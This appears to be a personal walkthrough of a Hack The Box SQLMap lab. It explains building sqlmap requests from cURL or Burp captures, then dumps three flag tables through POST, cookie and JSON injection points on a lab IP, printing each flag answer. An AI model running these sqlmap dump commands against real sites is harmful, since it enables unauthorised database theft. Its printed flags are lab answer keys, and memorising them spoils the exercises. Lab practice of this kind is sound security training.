@@ -1,0 +1,62 @@
+ima just say this right here i would just run all these from a burp request.. saved as a .txt file but theyre gonan be fancy and just use cURL commands : ] 
+
+Curl Commands
+One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools:
+
+
+website -> insepctor tools -> network -> right click copy as cURL 
+
+once pasted itll look like -> 
+
+MJBUCKNER@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
+
+
+Custom SQLMap Requests
+If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap.
+
+For example, if there is a requirement to specify the (session) cookie value to PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c option --cookie would be used as follows:
+
+SYNTAX: MJBUCKNER@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+
+OR for Header -> 
+
+SYNTAX: MJBUCKNER@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+
+but again... all of this can easily be done from Burp 
+
+so anyway were jsut gonna run it outta burp cause thats how ive alwasy done it : ] ] ] ] ] ]]]] ]] ]] ]] ]]]
+
+CHALLENGE : 83.136.252.199:50567
+
+
+QUESTION 1 -  What's the contents of table flag2? (Case #2) - HTB{700_much_c0n6r475_0n_p057_r3qu357}  
+1) go to http://83.136.252.199:50567 -> click case #2 
+2) here is what it says -> Detect and exploit SQLi vulnerability in POST parameter id
+3) for simplicity purposes ill do as they did in this section -> sqlmap -u "http://83.136.252.199:50567/case2.php" --data 'id=1' --batch --dump
+4) sqlmap -u "http://83.136.252.199:50567/case2.php" --data 'id=1' --batch --dump -> output: HTB{700_much_c0n6r475_0n_p057_r3qu357} 
+
+Question 2 -  What's the contents of table flag3? (Case #3) - HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} 
+1) http://83.136.252.199:50567/case3.php
+2) Detect and exploit SQLi vulnerability in Cookie value id=1
+3) so allmost the same as above... sqlmap -u 'http://83.136.252.199:50567/case3.php' -H 'Cookie: id=*' --batch --dump
+4) output: HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} 
+
+Question 3 - What's the contents of table flag4? (Case #4) - HTB{j450n_v00rh335_53nd5_6r475}
+1) http://83.136.252.199:50567/case4.php
+2) Detect and exploit SQLi vulnerability in JSON data {"id": 1}
+3) on webpage, go to inspector -> network -> refresh -> grab POST request headers -> show raw -> copy to file & tgo to Request -> show raw -> add {"id":1} to bottom of file so it should look like below : 
+
+POST /case4.php HTTP/1.1
+Host: 83.136.252.199:50567
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.252.199:50567/case4.php
+Content-Type: application/json
+Content-Length: 8
+
+{"id":1}
+
+4) then run this sqlmap command ->  sqlmap -r req4.txt  --batch -dump
+output: HTB{j450n_v00rh335_53nd5_6r475}
